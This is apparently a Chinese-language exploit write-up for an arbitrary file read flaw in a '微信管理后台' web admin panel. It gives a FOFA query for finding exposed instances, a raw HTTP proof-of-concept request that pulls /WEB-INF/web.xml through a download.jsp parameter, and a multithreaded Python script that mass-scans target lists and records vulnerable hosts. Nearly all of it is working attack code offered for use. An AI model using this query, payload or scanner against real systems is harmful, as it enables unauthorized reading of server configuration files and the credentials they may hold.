### FOFA

```markdown
title=="微信管理后台"
```

### POC

```markdown
GET /mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml HTTP/1.1
Host: 
```

![image-20241101162556686](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20241101162556686.png)

### py脚本

```python
# 导包
import argparse, sys, requests, time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  # 解除警告

GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    banner = '''

██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    

                                                    data: 2024-11-01
                                                    version: 1.0
                                                    author: hulless-oat
    '''
    print(banner)

def poc(target):
    url = target + "/mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml"

    try:
        res = requests.get(url=url, verify=False, timeout=5)
        if res.status_code == 200 and "http://" in res.text:
            print(f"[+] {GREEN}存在任意文件读取漏洞{target}\n{RESET}")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{target}\n")
        else:
            print(f"[-] 不存在漏洞")
    except:
        print(f"[*]无法访问")

def main():
    banner()
    # 处理命令行参数
    parser = argparse.ArgumentParser(description=' ')
    # 添加两个参数
    parser.add_argument('-u', '--url', dest='url', type=str, help='urllink')
    parser.add_argument('-f', '--file', dest='file', type=str, help='filename.txt(Absolute Path)')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':  # 主函数入口
    main()  # 入口  main()
```

